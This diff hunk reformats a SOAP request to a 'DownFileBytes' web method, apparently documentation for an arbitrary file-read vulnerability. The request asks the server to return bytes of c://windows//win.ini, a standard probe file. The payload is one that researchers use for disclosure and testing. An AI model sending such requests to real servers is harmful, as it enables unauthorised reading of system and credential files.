@@ -91,11 +91,11 @@ SOAPAction: "http://tempuri.org/DownFileBytes"
 <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
   <soap:Body>
     <DownFileBytes xmlns="http://tempuri.org/">
-      <sFileName>c://windows//win.ini</sFileName>
-      <iPosition>1</iPosition>
-      <iReadBytesLen>100</iReadBytesLen>
-      <bReadBytes>ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</bReadBytes>
-    </DownFileBytes>
+`      <sFileName>c://windows//win.ini</sFileName>`
+`      <iPosition>1</iPosition>`
+`      <iReadBytesLen>100</iReadBytesLen>`
+`      <bReadBytes>ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</bReadBytes>`
+    `</DownFileBytes>`
   </soap:Body>
 </soap:Envelope>
 
